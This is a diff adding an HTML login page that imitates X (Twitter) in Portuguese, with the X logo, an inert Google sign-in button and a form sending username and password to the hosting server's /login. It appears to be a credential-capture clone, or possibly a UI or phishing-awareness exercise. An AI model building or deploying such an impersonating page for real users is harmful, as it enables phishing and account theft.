@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>X / Twitter</title>
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><path d='M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z'/></svg>" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background: #000;
+      color: #e7e9ea;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+    
+    .container {
+      display: flex;
+      max-width: 1200px;
+      width: 100%;
+      gap: 40px;
+      align-items: center;
+    }
+    
+    .left {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+    }
+    
+    .logo {
+      font-size: 300px;
+      line-height: 1;
+    }
+    
+    .right {
+      flex: 1;
+      max-width: 600px;
+    }
+    
+    h1 {
+      font-size: 64px;
+      font-weight: bold;
+      margin-bottom: 30px;
+    }
+    
+    h2 {
+      font-size: 31px;
+      font-weight: bold;
+      margin-bottom: 30px;
+    }
+    
+    .card {
+      background: #000;
+      border-radius: 16px;
+      padding: 20px;
+      max-width: 400px;
+    }
+    
+    input {
+      width: 100%;
+      padding: 12px 16px;
+      font-size: 17px;
+      background: transparent;
+      border: 1px solid #333639;
+      border-radius: 4px;
+      color: #e7e9ea;
+      margin-bottom: 20px;
+      outline: none;
+    }
+    
+    input:focus {
+      border-color: #1d9bf0;
+    }
+    
+    button {
+      width: 100%;
+      padding: 12px;
+      background: #1d9bf0;
+      color: #fff;
+      font-size: 17px;
+      font-weight: bold;
+      border: none;
+      border-radius: 9999px;
+      cursor: pointer;
+      margin-bottom: 16px;
+    }
+    
+    button:hover {
+      background: #1a8cd8;
+    }
+    
+    .btn-google {
+      background: #fff;
+      color: #000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+    
+    .btn-google:hover {
+      background: #e6e6e6;
+    }
+    
+    .divider {
+      display: flex;
+      align-items: center;
+      margin: 20px 0;
+      color: #71767b;
+    }
+    
+    .divider::before,
+    .divider::after {
+      content: "";
+      flex: 1;
+      border-bottom: 1px solid #2f3336;
+    }
+    
+    .divider:not(:empty)::before {
+      margin-right: 16px;
+    }
+    
+    .divider:not(:empty)::after {
+      margin-left: 16px;
+    }
+    
+    .signup-text {
+      margin-top: 40px;
+      color: #71767b;
+      font-size: 15px;
+    }
+    
+    .signup-text a {
+      color: #1d9bf0;
+      text-decoration: none;
+    }
+    
+    .signup-text a:hover {
+      text-decoration: underline;
+    }
+    
+    .forgot {
+      text-align: center;
+      margin-top: 12px;
+    }
+    
+    .forgot a {
+      color: #1d9bf0;
+      text-decoration: none;
+      font-size: 15px;
+    }
+    
+    .forgot a:hover {
+      text-decoration: underline;
+    }
+    
+    @media (max-width: 1000px) {
+      .container {
+        flex-direction: column;
+      }
+      
+      .logo {
+        font-size: 100px;
+      }
+      
+      h1 {
+        font-size: 48px;
+      }
+      
+      h2 {
+        font-size: 24px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="left">
+      <div class="logo">𝕏</div>
+    </div>
+    
+    <div class="right">
+      <h1>A acontecer agora</h1>
+      <h2>Inicia sessão no X</h2>
+      
+      <div class="card">
+        <button class="btn-google">
+          <svg width="18" height="18" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
+          Entrar com o Google
+        </button>
+        
+        <div class="divider">ou</div>
+        
+        <form method="POST" action="/login">
+          <input type="text" name="username" placeholder="Email ou nome de utilizador" required />
+          <input type="password" name="password" placeholder="Palavra-passe" required />
+          <button type="submit">Seguinte</button>
+        </form>
+        
+        <div class="forgot">
+          <a href="#">Esqueceste-te da palavra-passe?</a>
+        </div>
+        
+        <div class="signup-text">
+          Não tens uma conta? <a href="#">Regista-te</a>
+        </div>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
